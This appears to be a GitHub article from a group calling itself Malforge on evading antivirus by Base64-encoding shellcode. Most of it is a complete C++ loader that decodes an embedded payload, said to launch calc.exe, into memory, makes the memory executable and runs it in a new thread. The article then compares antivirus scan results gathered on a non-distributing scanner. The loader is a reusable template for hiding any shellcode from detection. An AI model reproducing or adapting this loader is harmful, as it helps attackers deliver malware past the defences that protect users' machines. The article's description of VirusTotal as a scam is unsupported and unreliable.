# AntiVirus Evasion with Payload Encoding

## Introduction

This article explores a method to evade antivirus detection by encoding shellcode with Base64, making it harder for security tools to identify the payload.

This article explains how Base64 encoding is used to conceal a malicious payload. During execution, the payload is decoded and run, helping to bypass static antivirus detection—though dynamic analysis and sandbox environments may still flag it.

![image](https://github.com/user-attachments/assets/c086dade-7981-4e0d-9075-b0a8c0210afa)

### Base64 :

> Base64 - MDN Web Docs Glossary: Definitions of Web-related terms | MDN\
Base64 is a group of similar binary-to-text encoding schemes that represent binary data in an ASCII string format by [developer.mozilla.org](https://developer.mozilla.org/en-US/docs/Glossary/Base64)

**Base64** is a [binary-to-text encoding](https://en.wikipedia.org/wiki/Binary-to-text_encoding) method that converts binary data into ASCII characters by encoding it in a radix-64 format, making it suitable for data transmission and obfuscation.

Base64 encoding is used to safely encode binary data for storage or transmission over systems that handle ASCII, preserving data integrity during transfer. It's widely used in applications like email [(MIME)](https://en.wikipedia.org/wiki/MIME) and embedding complex data in formats like [XML](https://developer.mozilla.org/en-US/docs/Web/XML).

![image](https://github.com/user-attachments/assets/60411ba5-d53e-497a-9936-e1265616d7f1)

Below is the code implementation of Base64 encoding technique for antivirus evasion :

```C++
// open calc.exe
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment(lib, "Crypt32.lib")

unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
unsigned int calc_len = sizeof(calc_payload);

int DecodeBase64(const BYTE *src, unsigned int srcLen, char *dst, unsigned int dstLen)
{

    DWORD outLen;
    BOOL fRet;

    outLen = dstLen;
    fRet = CryptStringToBinary((LPCSTR)src, srcLen, CRYPT_STRING_BASE64, (BYTE *)dst, &outLen, NULL, NULL);

    if (!fRet)
        outLen = 0; // failed

    return (outLen);
}

int main(void)
{

    void *exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Allocate new memory buffer for payload
    exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decode the payload back to binary form
    DecodeBase64((const BYTE *)calc_payload, calc_len, (char *)exec_mem, calc_len);

    // Make the buffer executable
    rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

    // If all good, execute!
    if (rv != 0)
    {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}
```

Two functions are used in this example:

  - **Main:** First, it allocates memory with `VirtualAlloc`, then decodes the Base64 payload using the `DecodeBase64` function. After preparing the payload, it marks the buffer as executable with             
    `VirtualProtect` and finally executes it using `CreateThread`.

  - **DecodeBase64:** This function converts the Base64 encoded payload into plain text using `CryptStringToBinary` and returns the length of the decoded payload."

## POC :

To test the payload against antivirus software, the following website is used.

> AntiScan.Me | Online Virus Scanner Without Result Distribution\
Scan your file online with multiple different antiviruses without distributing the results of your scan. [www.antiscan.me](https://www.antiscan.me/)

Virustotal, is currently considered a scam for using the malware that is published on it

**Virustotal** is often criticized for using the malware uploaded to its platform.

This are the results without Base64 payload encoding:

![image](https://github.com/user-attachments/assets/eeb7afac-94cb-489c-8dc5-bb3504302ff3)

This are the results with Base64 payload encoding:

![image](https://github.com/user-attachments/assets/9e7ddb18-d699-4003-8efa-65531d78b9d1)

## Conclusions : 

In conclusion, using Base64 helps evade some antivirus software, but not all. Future articles will explore additional methods to bypass more antivirus detection. 

Thanks for reading! :space_invader:	

**-Malforge Group.**




